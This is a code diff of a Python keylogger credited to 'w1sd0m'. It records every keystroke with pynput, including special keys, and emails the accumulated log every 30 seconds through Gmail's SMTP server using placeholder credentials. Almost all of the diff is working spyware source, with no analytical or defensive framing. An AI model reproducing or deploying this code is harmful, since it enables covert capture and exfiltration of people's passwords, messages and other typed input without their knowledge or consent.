@@ -1,37 +1,42 @@
+#the following lines of code were written by w1sd0m
+import pynput.keyboard
+from pynput.keyboard import Listener
 import smtplib
 import threading
-
-import pynput
-
-log=""
-
-def callback_function(key):
+log="--Starting--"
+def callback(keys):
     global log
+    print("")
     try:
-        log=log+key.char.encode("utf-8")
+        log +=str(keys.char)
     except AttributeError:
-        if key == key.space:
-            log=log + " "
+        if keys == keys.space:
+            log +=" "
+        elif keys == keys.backspace:
+            log +=" BACKSPACE "
+        elif keys == keys.enter:
+            log += "\n"
+        elif keys == keys.caps_lock:
+            log += " CAPSLOCK "
         else:
-            log=log+str(key)
+           log +=str(keys)
     print(log)
 
-def send_email(email,password,message):
-    email_server=smtplib.SMTP("smtp.gmail.com",587)
-    email_server.starttls()
-    email_server.login(email,password)
-    email_server.sendmail(email,email,message)
-    email_server.quit()
+def sending_mail(email,passwd,message):
+    service = smtplib.SMTP("smtp.gmail.com", 587)
+    service.starttls()
+    service.login(email,passwd)
+    service.sendmail(email,email,message)
+    service.quit()
 
-def thread_function():
+def thread():
     global log
-    send_email("your_email","your_password",log)
-    log=""
-    timer_object =threading.Timer(30,thread_function)
-    timer_object.start()
+    sending_mail("email_address","password",log)
+    log = ""
+    timer = threading.Timer(30,thread)
+    timer.start()
 
-
-keylogger_listener=pynput.keyboard.Listener(on_press=callback_function)
-with keylogger_listener:
-    thread_function()
-    keylogger_listener.join()
+listener = pynput.keyboard.Listener(on_press=callback)
+with listener:
+    thread()
+    listener.join()
